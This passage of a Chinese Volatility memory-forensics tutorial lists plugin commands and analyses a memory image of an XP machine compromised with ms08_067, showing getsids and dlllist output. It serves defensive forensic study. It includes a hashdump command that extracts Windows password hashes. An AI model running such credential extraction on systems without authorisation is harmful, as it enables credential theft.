<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vol.py -f WIN7-Z9M8R8-1-20230120-023337.raw --profile=Win7SP1x64 printkey -K <span class="string">&quot;SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230120154730410-313984900.png" /></p>
<h4
id="正在运行的程序运行过多少次最后一次运行时间等">（5）正在运行的程序、运行过多少次、最后一次运行时间等</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vol.py -f WIN7-Z9M8R8-1-20230120-023337.raw --profile=Win7SP1x64 userassist</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230120155113019-1269666327.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230120155220330-206578175.png" /></p>
<h4 id="进程列表及物理内存">（6）进程列表及物理内存</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vol.py -f WIN7-Z9M8R8-1-20230120-023337.raw --profile=Win7SP1x64 pslist </span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230120150144331-946402617.png" /></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vol.py -f WIN7-Z9M8R8-1-20230120-023337.raw --profile=Win7SP1x64 pstree  <span class="comment">#以树形显示父子进程关系</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230120151134982-503252418.png" /></p>
<ul>
<li><strong>dump 某一具体进程相关内存信息</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vol.py -f WIN7-Z9M8R8-1-20230120-023337.raw --profile=Win7SP1x64 memdump -p 2584 -D Temp      <span class="comment">#-D指定保存位置</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230120160354348-610958170.png" /></p>
<ul>
<li><strong>可以直接用 hexeditor 读取分析</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexeditor Temp/2584.dmp</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230120160625811-355211811.png" /></p>
<ul>
<li><strong>也可提取字符串分析可疑之处（木马，病毒等）</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">strings Temp/2584.dmp</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230120160919598-356966755.png" /></p>
<ul>
<li><strong>加上过滤操作分析</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230120161038642-427977941.png" /></p>
<h4 id="命令历史信息">（7）命令历史信息</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vol.py -f WIN7-Z9M8R8-1-20230120-023337.raw --profile=Win7SP1x64 cmdscan </span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230120161737548-71831356.png" /></p>
<h4 id="网络连接信息">（8）网络连接信息</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vol.py -f WIN7-Z9M8R8-1-20230120-023337.raw --profile=Win7SP1x64 netscan   <span class="comment">#可用connscan查看已连接的</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230120162047422-1125437373.png" /></p>
<h4 id="ie-历史">（9）IE 历史</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vol.py -f WIN7-Z9M8R8-1-20230120-023337.raw --profile=Win7SP1x64 iehistory </span><br></pre></td></tr></table></figure>
<h4 id="提取hash">（10）提取hash</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#volatility  -f  ***.raw/***.dmp  --profile=***  hashdump  -y system虚地址  -s  SAM虚地址</span></span><br><span class="line">vol.py -f WIN7-Z9M8R8-1-20230120-023337.raw --profile=Win7SP1x64 hashdump -y 0xfffff8a000024010 -s 0xfffff8a00184b160</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230120164417431-1214554380.png" /></p>
<h4 id="timeline-插件">（11）Timeline 插件</h4>
<ul>
<li>功能：基于时间线从多个位置收集大量系统活动信息，usn只从硬盘读写方面勾画活动情况，timeliner从多个位置收集大量信息活动信息，尽最大能力把这台主机上发生过什么事情、做过什么操作进行勾画。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vol.py -f WIN7-Z9M8R8-1-20230120-023337.raw  --profile=Win7SP1x64  timeliner</span><br></pre></td></tr></table></figure>
<h3 id="volatility外部插件">3、Volatility外部插件</h3>
<p><strong>官方-社区插件项目：</strong><a
href="https://github.com/volatilityfoundation/community"
class="uri">https://github.com/volatilityfoundation/community</a></p>
<p>将对应插件放置/usr/local/lib/python2.7/dist-
packages/volatility/plugins目录下即可，使用方法同内部插件或参见：&lt;https://github.com/volatilityfoundation/volatility/wiki/Volatility%20Usage#specifying-
additional-plugin-directories&gt;</p>
<p>示例：USN 日志记录插件（下载：<a
href="https://github.com/tomspencer/volatility/tree/master/usnparser"
class="uri">https://github.com/tomspencer/volatility/tree/master/usnparser</a>）</p>
<ul>
<li>功能：用于跟踪硬盘内容变化（属性），如文件权限变化，但不记录具体变更的内容，如某个文件中添加的具体内容。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 直接在终端在输出</span></span><br><span class="line">vol.py -f WIN7-Z9M8R8-1-20230125-140115.raw --profile=Win7SP1x64 usnparser</span><br><span class="line"><span class="comment"># 输出结果保存个文件</span></span><br><span class="line">vol.py -f WIN7-Z9M8R8-1-20230125-140115.raw --profile=Win7SP1x64 usnparser --output=csv --output-file=usn.csv </span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230125223915798-281041832.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230125224026277-1523913424.png" /></p>
<h3 id="volatility案例演示">4、Volatility案例演示</h3>
<p>利用漏洞ms08_067通过msf控制XPSP3(建立meterpreter会话)，制作内存镜像进行分析。</p>
<h4 id="分析查询操作系统">（1）分析查询操作系统</h4>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230122095958604-1757572661.png" /></p>
<h4 id="查看可疑进程">（2）查看可疑进程</h4>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230122101409965-145600311.png" /></p>
<p>木马，病毒等一般都会被隐藏执行，这样很难看出哪个进程有问题。</p>
<h4 id="检查网络连接">（3）检查网络连接</h4>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230122101643126-2064107411.png" /></p>
<p>分析可知仅有一个1060进程建立了网络连接，可进一步分析。</p>
<h4
id="获取已建立网络连接进程的具体信息">（4）获取已建立网络连接进程的具体信息</h4>
<p>示例（如果是查看多个进程就用逗号","分隔）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># vol.py -f XP_SP3-20230121-111153.raw --profile=WinXPSP3x86 getsids -p 1060,1200,1128　　　　　　#拿1060，1128，1200三个svchost进程对比，更易看出端倪。</span></span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">svchost.exe (1060): S-1-5-18 (Local System)</span><br><span class="line">svchost.exe (1060): S-1-5-32-544 (Administrators)</span><br><span class="line">svchost.exe (1060): S-1-1-0 (Everyone)</span><br><span class="line">svchost.exe (1060): S-1-5-11 (Authenticated Users)</span><br><span class="line">svchost.exe (1128): S-1-5-20 (NT Authority)</span><br><span class="line">svchost.exe (1128): S-1-5-20 (NT Authority)</span><br><span class="line">svchost.exe (1128): S-1-1-0 (Everyone)</span><br><span class="line">svchost.exe (1128): S-1-5-32-545 (Users)</span><br><span class="line">svchost.exe (1128): S-1-5-6 (Service)</span><br><span class="line">svchost.exe (1128): S-1-5-11 (Authenticated Users)</span><br><span class="line">svchost.exe (1128): S-1-5-5-0-58102 (Logon Session)</span><br><span class="line">svchost.exe (1128): S-1-2-0 (Local (Users with the ability to <span class="built_in">log</span> <span class="keyword">in</span> locally))</span><br><span class="line">svchost.exe (1128): S-1-1-0 (Everyone)</span><br><span class="line">svchost.exe (1128): S-1-5-11 (Authenticated Users)</span><br><span class="line">svchost.exe (1128): S-1-2-0 (Local (Users with the ability to <span class="built_in">log</span> <span class="keyword">in</span> locally))</span><br><span class="line">svchost.exe (1128): S-1-5-32-545 (Users)</span><br><span class="line">svchost.exe (1200): S-1-5-19 (NT Authority)</span><br><span class="line">svchost.exe (1200): S-1-5-19 (NT Authority)</span><br><span class="line">svchost.exe (1200): S-1-1-0 (Everyone)</span><br><span class="line">svchost.exe (1200): S-1-5-32-545 (Users)</span><br><span class="line">svchost.exe (1200): S-1-5-6 (Service)</span><br><span class="line">svchost.exe (1200): S-1-5-11 (Authenticated Users)</span><br><span class="line">svchost.exe (1200): S-1-5-5-0-58822 (Logon Session)</span><br><span class="line">svchost.exe (1200): S-1-2-0 (Local (Users with the ability to <span class="built_in">log</span> <span class="keyword">in</span> locally))</span><br><span class="line">svchost.exe (1200): S-1-1-0 (Everyone)</span><br><span class="line">svchost.exe (1200): S-1-5-11 (Authenticated Users)</span><br><span class="line">svchost.exe (1200): S-1-2-0 (Local (Users with the ability to <span class="built_in">log</span> <span class="keyword">in</span> locally))</span><br><span class="line">svchost.exe (1200): S-1-5-32-545 (Users)</span><br></pre></td></tr></table></figure>
<p>svchost.exe默认不具备system权限，可将1060进程和1200，1128进程相比较，1060很可疑。</p>
<h4 id="查看可疑进程所调用的dll库">（5）查看可疑进程所调用的DLL库</h4>
<p>两种情况，要么dll特别多，要么dll特别少，一种是为了减小体积而调用系统自带的dll实现自身功能，一种是如果全部调系统自身的dll那么兼容性就会变差，不同系统之间的dll文件很多是不一样的，所以直接把所需要的dll加载到恶意程序里，但是程序的体积会特别大。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># vol.py -f XP_SP3-20230121-111153.raw --profile=WinXPSP3x86 dlllist -p 1060,1200,1128</span></span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">************************************************************************</span><br><span class="line">svchost.exe pid:   1060</span><br><span class="line">Command line : C:\WINDOWS\System32\svchost.exe -k netsvcs</span><br><span class="line">Service Pack 3</span><br><span class="line"></span><br><span class="line">Base             Size  LoadCount LoadTime                       Path</span><br><span class="line">    ---------- ---------- ---------- ------------------------------ ----</span><br><span class="line">    0x01000000     0x6000     0xffff                                C:\WINDOWS\System32\svchost.exe</span><br><span class="line">    0x7c900000    0xaf000     0xffff                                C:\WINDOWS\system32\ntdll.dll</span><br><span class="line">    0x7c800000    0xf6000     0xffff                                C:\WINDOWS\system32\kernel32.dll</span><br><span class="line">    0x77dd0000    0x9b000     0xffff                                C:\WINDOWS\system32\ADVAPI32.dll</span><br><span class="line">    0x77e70000    0x92000     0xffff                                C:\WINDOWS\system32\RPCRT4.dll</span><br><span class="line">    0x77fe0000    0x11000     0xffff                                C:\WINDOWS\system32\Secur32.dll</span><br><span class="line">    0x5cb70000    0x26000        0x1                                C:\WINDOWS\System32\ShimEng.dll</span><br><span class="line">    0x6f880000   0x1ca000        0x1                                C:\WINDOWS\AppPatch\AcGenral.DLL</span><br><span class="line">    0x7e410000    0x91000      0x303                                C:\WINDOWS\system32\USER32.dll</span><br><span class="line">    0x77f10000    0x49000      0x1b6                                C:\WINDOWS\system32\GDI32.dll</span><br><span class="line">    0x76b40000    0x2d000       0x11                                C:\WINDOWS\System32\WINMM.dll</span><br><span class="line">    0x774e0000   0x13d000       0xbe                                C:\WINDOWS\system32\ole32.dll</span><br><span class="line">    0x77c10000    0x58000      0x322                                C:\WINDOWS\system32\msvcrt.dll</span><br><span class="line">    0x77120000    0x8b000       0x86                                C:\WINDOWS\system32\OLEAUT32.dll</span><br><span class="line">    0x77be0000    0x15000        0x1                                C:\WINDOWS\System32\MSACM32.dll</span><br><span class="line">    0x77c00000     0x8000       0x24                                C:\WINDOWS\system32\VERSION.dll</span><br><span class="line">    0x7c9c0000   0x817000       0x12                                C:\WINDOWS\system32\SHELL32.dll</span><br><span class="line">    0x77f60000    0x76000       0x49                                C:\WINDOWS\system32\SHLWAPI.dll</span><br><span class="line">    0x769c0000    0xb4000       0x12                                C:\WINDOWS\system32\USERENV.dll</span><br><span class="line">    0x5ad70000    0x38000        0x4                                C:\WINDOWS\System32\UxTheme.dll</span><br><span class="line">    0x773d0000   0x103000        0x9                                C:\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.5512_x-ww_35d4ce83\comctl32.dll</span><br><span class="line">    0x5d090000    0x9a000        0x6                                C:\WINDOWS\system32\comctl32.dll</span><br><span class="line">    0x77690000    0x21000        0x1                                C:\WINDOWS\System32\NTMARTA.DLL</span><br><span class="line">    0x71bf0000    0x13000        0xf                                C:\WINDOWS\System32\SAMLIB.dll</span><br><span class="line">    0x76f60000    0x2c000       0x1e                                C:\WINDOWS\system32\WLDAP32.dll</span><br><span class="line">    0x00630000   0x2c5000        0x2                                C:\WINDOWS\System32\xpsp2res.dll</span><br><span class="line">    0x776e0000    0x23000        0x3                                c:\windows\system32\shsvcs.dll</span><br><span class="line">    0x76360000    0x10000       0x16                                C:\WINDOWS\System32\WINSTA.dll</span><br><span class="line">    0x5b860000    0x55000       0x70                                C:\WINDOWS\system32\NETAPI32.dll</span><br><span class="line">    0x7d4b0000    0x22000        0x5                                c:\windows\system32\dhcpcsvc.dll</span><br><span class="line">    0x76f20000    0x27000       0x10                                c:\windows\system32\DNSAPI.dll</span><br><span class="line">    0x71ab0000    0x17000       0x6f                                c:\windows\system32\WS2_32.dll</span><br><span class="line">    0x71aa0000     0x8000       0x3f                                c:\windows\system32\WS2HELP.dll</span><br><span class="line">    0x76d60000    0x19000       0x16                                c:\windows\system32\iphlpapi.dll</span><br><span class="line">    0x68000000    0x36000        0x1                                C:\WINDOWS\System32\rsaenh.dll</span><br><span class="line">    0x7db10000    0x8c000        0x3                                c:\windows\system32\wzcsvc.dll</span><br><span class="line">    0x76e80000     0xe000       0x42                                c:\windows\system32\rtutils.dll</span><br><span class="line">    0x76d30000     0x4000        0x5                                c:\windows\system32\WMI.dll</span><br><span class="line">    0x77a80000    0x95000       0x32                                C:\WINDOWS\system32\CRYPT32.dll</span><br><span class="line">    0x77b20000    0x12000       0x21                                C:\WINDOWS\system32\MSASN1.dll</span><br><span class="line">    0x72810000     0xb000        0x4                                c:\windows\system32\EapolQec.dll</span><br><span class="line">    0x76b20000    0x11000       0x22                                c:\windows\system32\ATL.DLL</span><br><span class="line">    0x726c0000    0x16000        0x4                                c:\windows\system32\QUtil.dll</span><br><span class="line">    0x76080000    0x65000       0x21                                c:\windows\system32\MSVCP60.dll</span><br><span class="line">    0x478c0000     0xa000        0xd                                c:\windows\system32\dot3api.dll</span><br><span class="line">    0x76f50000     0x8000       0x12                                c:\windows\system32\WTSAPI32.dll</span><br><span class="line">    0x606b0000   0x10d000        0x5                                c:\windows\system32\ESENT.dll</span><br><span class="line">    0x76fd0000    0x7f000        0x8                                C:\WINDOWS\System32\CLBCATQ.DLL</span><br><span class="line">    0x77050000    0xc5000       0x17                                C:\WINDOWS\System32\COMRes.dll</span><br><span class="line">    0x76b70000    0x27000        0x5                                C:\WINDOWS\System32\rastls.dll</span><br><span class="line">    0x754d0000    0x80000        0x6                                C:\WINDOWS\system32\CRYPTUI.dll</span><br><span class="line">    0x771b0000    0xaa000        0x9                                C:\WINDOWS\system32\WININET.dll</span><br><span class="line">    0x76c30000    0x2e000        0xa                                C:\WINDOWS\system32\WINTRUST.dll</span><br><span class="line">    0x76c90000    0x28000        0xa                                C:\WINDOWS\system32\IMAGEHLP.dll</span><br><span class="line">    0x76d40000    0x18000        0xa                                C:\WINDOWS\System32\MPRAPI.dll</span><br><span class="line">    0x77cc0000    0x32000        0xa                                C:\WINDOWS\System32\ACTIVEDS.dll</span><br><span class="line">    0x76e10000    0x25000        0xa                                C:\WINDOWS\System32\adsldpc.dll</span><br><span class="line">    0x77920000    0xf3000       0x10                                C:\WINDOWS\System32\SETUPAPI.dll</span><br><span class="line">    0x76ee0000    0x3c000        0xe                                C:\WINDOWS\System32\RASAPI32.dll</span><br><span class="line">    0x76e90000    0x12000       0x10                                C:\WINDOWS\System32\rasman.dll</span><br><span class="line">    0x76eb0000    0x2f000        0xf                                C:\WINDOWS\System32\TAPI32.dll</span><br><span class="line">    0x767f0000    0x27000        0x5                                C:\WINDOWS\System32\SCHANNEL.dll</span><br><span class="line">    0x723d0000    0x1c000        0x5                                C:\WINDOWS\System32\WinSCard.dll</span><br><span class="line">    0x76bf0000     0xb000        0xa                                C:\WINDOWS\System32\PSAPI.DLL</span><br><span class="line">    0x76bd0000    0x16000        0x3                                C:\WINDOWS\System32\raschap.dll</span><br><span class="line">    0x77c70000    0x24000        0x1                                C:\WINDOWS\system32\msv1_0.dll</span><br><span class="line">    0x77300000    0x33000        0x1                                c:\windows\system32\schedsvc.dll</span><br><span class="line">    0x767a0000    0x13000        0x9                                c:\windows\system32\NTDSAPI.dll</span><br><span class="line">    0x74f50000     0x5000        0x1                                C:\WINDOWS\System32\MSIDLE.DLL</span><br><span class="line">    0x708b0000     0xd000        0x1                                c:\windows\system32\audiosrv.dll</span><br><span class="line">    0x76e40000    0x23000        0x1                                c:\windows\system32\wkssvc.dll</span><br><span class="line">    0x76ce0000    0x12000        0x1                                c:\windows\system32\cryptsvc.dll</span><br><span class="line">    0x77b90000    0x32000        0x1                                c:\windows\system32\certcli.dll</span><br><span class="line">    0x74f90000     0x9000        0x1                                c:\windows\system32\dmserver.dll</span><br><span class="line">    0x74f80000     0x9000        0x1                                c:\windows\system32\ersvc.dll</span><br><span class="line">    0x77710000    0x42000        0x3                                c:\windows\system32\es.dll</span><br><span class="line">    0x74f40000     0xc000        0x1                                c:\windows\pchealth\helpctr\binaries\pchsvc.dll</span><br><span class="line">    0x75090000    0x1a000        0x1                                c:\windows\system32\srvsvc.dll</span><br><span class="line">    0x77d00000    0x33000        0x2                                c:\windows\system32\netman.dll</span><br><span class="line">    0x76400000   0x1a5000        0x5                                c:\windows\system32\netshell.dll</span><br><span class="line">    0x76c00000    0x2e000        0x5                                c:\windows\system32\credui.dll</span><br><span class="line">    0x736d0000     0x6000        0x5                                c:\windows\system32\dot3dlg.dll</span><br><span class="line">    0x5dca0000    0x28000        0x5                                c:\windows\system32\OneX.DLL</span><br><span class="line">    0x745b0000    0x22000        0x5                                c:\windows\system32\eappcfg.dll</span><br><span class="line">    0x5dcd0000     0xe000        0x5                                c:\windows\system32\eappprxy.dll</span><br><span class="line">    0x73030000    0x10000        0x2                                c:\windows\system32\WZCSAPI.DLL</span><br><span class="line">    0x662b0000    0x58000        0x6                                C:\WINDOWS\System32\HNETCFG.DLL</span><br><span class="line">    0x722d0000     0xd000        0x1                                c:\windows\system32\sens.dll</span><br><span class="line">    0x73d20000     0x8000        0x1                                c:\windows\system32\seclogon.dll</span><br><span class="line">    0x7e720000    0xb0000        0x1                                C:\WINDOWS\System32\SXS.DLL</span><br><span class="line">    0x76620000   0x13c000        0x4                                C:\WINDOWS\system32\comsvcs.dll</span><br><span class="line">    0x75130000    0x14000        0x4                                C:\WINDOWS\system32\colbact.DLL</span><br><span class="line">    0x750f0000    0x13000        0x4                                C:\WINDOWS\system32\MTXCLU.DLL</span><br><span class="line">    0x71ad0000     0x9000        0x4                                C:\WINDOWS\system32\WSOCK32.dll</span><br><span class="line">    0x76d10000    0x12000        0x3                                C:\WINDOWS\System32\CLUSAPI.DLL</span><br><span class="line">    0x750b0000    0x12000        0x1                                C:\WINDOWS\System32\RESUTILS.DLL</span><br><span class="line">    0x751a0000    0x2e000        0x1                                c:\windows\system32\srsvc.dll</span><br><span class="line">    0x74ad0000     0x8000        0x1                                c:\windows\system32\POWRPROF.dll</span><br><span class="line">    0x75070000    0x19000        0x1                                c:\windows\system32\trkwks.dll</span><br><span class="line">    0x767c0000    0x2c000        0x3                                c:\windows\system32\w32time.dll</span><br><span class="line">    0x71a50000    0x3f000        0x5                                C:\WINDOWS\system32\mswsock.dll</span><br><span class="line">    0x71a90000     0x8000        0x1                                C:\WINDOWS\System32\wshtcpip.dll</span><br><span class="line">    0x59490000    0x28000        0x1                                c:\windows\system32\wbem\wmisvc.dll</span><br><span class="line">    0x753e0000    0x6d000        0x1                                C:\WINDOWS\system32\VSSAPI.DLL</span><br><span class="line">    0x50000000     0x5000        0x1                                c:\windows\system32\wuauserv.dll</span><br><span class="line">    0x50040000   0x119000        0x1                                C:\WINDOWS\system32\wuaueng.dll</span><br><span class="line">    0x75260000    0x29000        0x1                                C:\WINDOWS\System32\ADVPACK.dll</span><br><span class="line">    0x75150000    0x13000        0x2                                C:\WINDOWS\System32\Cabinet.dll</span><br><span class="line">    0x600a0000     0xb000        0x1                                C:\WINDOWS\System32\mspatcha.dll</span><br><span class="line">    0x76bb0000     0x5000        0x1                                C:\WINDOWS\System32\sfc.dll</span><br><span class="line">    0x76c60000    0x2a000        0x2                                C:\WINDOWS\System32\sfc_os.dll</span><br><span class="line">    0x76780000     0x9000        0x1                                C:\WINDOWS\System32\SHFOLDER.dll</span><br><span class="line">    0x4d4f0000    0x59000        0x3                                C:\WINDOWS\System32\WINHTTP.dll</span><br><span class="line">    0x73000000    0x26000        0x1                                C:\WINDOWS\System32\WINSPOOL.DRV</span><br><span class="line">    0x76da0000    0x16000        0x1                                c:\windows\system32\browser.dll</span><br><span class="line">    0x66460000    0x55000        0x1                                c:\windows\system32\ipnathlp.dll</span><br><span class="line">    0x776c0000    0x12000        0x3                                c:\windows\system32\AUTHZ.dll</span><br><span class="line">    0x4c0a0000    0x17000        0x1                                c:\windows\system32\wscsvc.dll</span><br><span class="line">    0x7d1e0000   0x2bc000        0x4                                c:\windows\system32\msi.dll</span><br><span class="line">    0x762c0000    0x85000        0x1                                C:\WINDOWS\System32\Wbem\wbemcore.dll</span><br><span class="line">    0x75310000    0x3f000        0x4                                C:\WINDOWS\System32\Wbem\esscli.dll</span><br><span class="line">    0x75290000    0x37000        0xf                                C:\WINDOWS\System32\Wbem\wbemcomn.dll</span><br><span class="line">    0x75690000    0x76000        0x8                                C:\WINDOWS\System32\Wbem\FastProx.dll</span><br><span class="line">    0x75020000    0x1b000        0x1                                C:\WINDOWS\system32\wbem\wmiutils.dll</span><br><span class="line">    0x75200000    0x2f000        0x1                                C:\WINDOWS\system32\wbem\repdrvfs.dll</span><br><span class="line">    0x597f0000    0x6d000        0x1                                C:\WINDOWS\system32\wbem\wmiprvsd.dll</span><br><span class="line">    0x5f770000     0xc000        0x2                                C:\WINDOWS\system32\NCObjAPI.DLL</span><br><span class="line">    0x75390000    0x46000        0x1                                C:\WINDOWS\system32\wbem\wbemess.dll</span><br><span class="line">    0x76de0000    0x24000        0x1                                C:\WINDOWS\system32\upnp.dll</span><br><span class="line">    0x74f00000     0xc000        0x1                                C:\WINDOWS\system32\SSDPAPI.dll</span><br><span class="line">    0x76fc0000     0x6000        0x1                                C:\WINDOWS\System32\rasadhlp.dll</span><br><span class="line">    0x77b40000    0x22000        0x1                                C:\WINDOWS\system32\Apphelp.dll</span><br><span class="line">    0x5f740000     0xe000        0x1                                C:\WINDOWS\system32\wbem\ncprov.dll</span><br><span class="line">    0x755f0000    0x9a000        0x1                                C:\WINDOWS\system32\netcfgx.dll</span><br><span class="line">    0x768d0000    0xa4000        0x1                                C:\WINDOWS\System32\RASDLG.dll</span><br><span class="line">    0x74ed0000     0xe000        0x1                                C:\WINDOWS\system32\wbem\wbemsvc.dll</span><br><span class="line">    0x6fb10000    0x9e000        0x2                                C:\WINDOWS\System32\catsrvut.dll</span><br><span class="line">    0x6fbd0000    0x3d000        0x1                                C:\WINDOWS\System32\catsrv.dll</span><br><span class="line">    0x61990000     0x9000        0x1                                C:\WINDOWS\System32\MfcSubs.dll</span><br><span class="line">    0x71b20000    0x12000        0x2                                C:\WINDOWS\system32\MPR.dll</span><br><span class="line">    0x7e1e0000    0xa2000        0x1                                C:\WINDOWS\system32\urlmon.dll</span><br><span class="line">    0x71f80000     0x4000        0x1                                C:\WINDOWS\System32\security.dll</span><br><span class="line">    ************************************************************************</span><br><span class="line">    svchost.exe pid:   1128</span><br><span class="line">    Command line : C:\WINDOWS\system32\svchost.exe -k NetworkService</span><br><span class="line">    Service Pack 3</span><br><span class="line">    </span><br><span class="line">    Base             Size  LoadCount LoadTime                       Path</span><br><span class="line">    ---------- ---------- ---------- ------------------------------ ----</span><br><span class="line">    0x01000000     0x6000     0xffff                                C:\WINDOWS\system32\svchost.exe</span><br><span class="line">    0x7c900000    0xaf000     0xffff                                C:\WINDOWS\system32\ntdll.dll</span><br><span class="line">    0x7c800000    0xf6000     0xffff                                C:\WINDOWS\system32\kernel32.dll</span><br><span class="line">    0x77dd0000    0x9b000     0xffff                                C:\WINDOWS\system32\ADVAPI32.dll</span><br><span class="line">    0x77e70000    0x92000     0xffff                                C:\WINDOWS\system32\RPCRT4.dll</span><br><span class="line">    0x77fe0000    0x11000     0xffff                                C:\WINDOWS\system32\Secur32.dll</span><br><span class="line">    0x5cb70000    0x26000        0x1                                C:\WINDOWS\system32\ShimEng.dll</span><br><span class="line">    0x6f880000   0x1ca000        0x1                                C:\WINDOWS\AppPatch\AcGenral.DLL</span><br><span class="line">    0x7e410000    0x91000       0x1a                                C:\WINDOWS\system32\USER32.dll</span><br><span class="line">    0x77f10000    0x49000       0x14                                C:\WINDOWS\system32\GDI32.dll</span><br><span class="line">    0x76b40000    0x2d000        0x2                                C:\WINDOWS\system32\WINMM.dll</span><br><span class="line">    0x774e0000   0x13d000        0x2                                C:\WINDOWS\system32\ole32.dll</span><br><span class="line">    0x77c10000    0x58000       0x17                                C:\WINDOWS\system32\msvcrt.dll</span><br><span class="line">    0x77120000    0x8b000        0x1                                C:\WINDOWS\system32\OLEAUT32.dll</span><br><span class="line">    0x77be0000    0x15000        0x1                                C:\WINDOWS\system32\MSACM32.dll</span><br><span class="line">    0x77c00000     0x8000        0x1                                C:\WINDOWS\system32\VERSION.dll</span><br><span class="line">    0x7c9c0000   0x817000        0x1                                C:\WINDOWS\system32\SHELL32.dll</span><br><span class="line">    0x77f60000    0x76000        0x3                                C:\WINDOWS\system32\SHLWAPI.dll</span><br><span class="line">    0x769c0000    0xb4000        0x1                                C:\WINDOWS\system32\USERENV.dll</span><br><span class="line">    0x5ad70000    0x38000        0x1                                C:\WINDOWS\system32\UxTheme.dll</span><br><span class="line">    0x773d0000   0x103000        0x1                                C:\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.5512_x-ww_35d4ce83\comctl32.dll</span><br><span class="line">    0x5d090000    0x9a000        0x1                                C:\WINDOWS\system32\comctl32.dll</span><br><span class="line">    0x76770000     0xd000        0x1                                c:\windows\system32\dnsrslvr.dll</span><br><span class="line">    0x76f20000    0x27000        0x1                                c:\windows\system32\DNSAPI.dll</span><br><span class="line">    0x71ab0000    0x17000        0x7                                c:\windows\system32\WS2_32.dll</span><br><span class="line">    0x71aa0000     0x8000        0x8                                c:\windows\system32\WS2HELP.dll</span><br><span class="line">    0x76d60000    0x19000        0x2                                c:\windows\system32\iphlpapi.dll</span><br><span class="line">    0x68000000    0x36000        0x1                                C:\WINDOWS\system32\rsaenh.dll</span><br><span class="line">    0x71a50000    0x3f000        0x2                                C:\WINDOWS\system32\mswsock.dll</span><br><span class="line">    0x662b0000    0x58000        0x1                                C:\WINDOWS\system32\hnetcfg.dll</span><br><span class="line">    0x71a90000     0x8000        0x1                                C:\WINDOWS\System32\wshtcpip.dll</span><br><span class="line">    ************************************************************************</span><br><span class="line">    svchost.exe pid:   1200</span><br><span class="line">    Command line : C:\WINDOWS\system32\svchost.exe -k LocalService</span><br><span class="line">    Service Pack 3</span><br><span class="line">    </span><br><span class="line">    Base             Size  LoadCount LoadTime                       Path</span><br><span class="line">    ---------- ---------- ---------- ------------------------------ ----</span><br><span class="line">    0x01000000     0x6000     0xffff                                C:\WINDOWS\system32\svchost.exe</span><br><span class="line">    0x7c900000    0xaf000     0xffff                                C:\WINDOWS\system32\ntdll.dll</span><br><span class="line">    0x7c800000    0xf6000     0xffff                                C:\WINDOWS\system32\kernel32.dll</span><br><span class="line">    0x77dd0000    0x9b000     0xffff                                C:\WINDOWS\system32\ADVAPI32.dll</span><br><span class="line">    0x77e70000    0x92000     0xffff                                C:\WINDOWS\system32\RPCRT4.dll</span><br><span class="line">    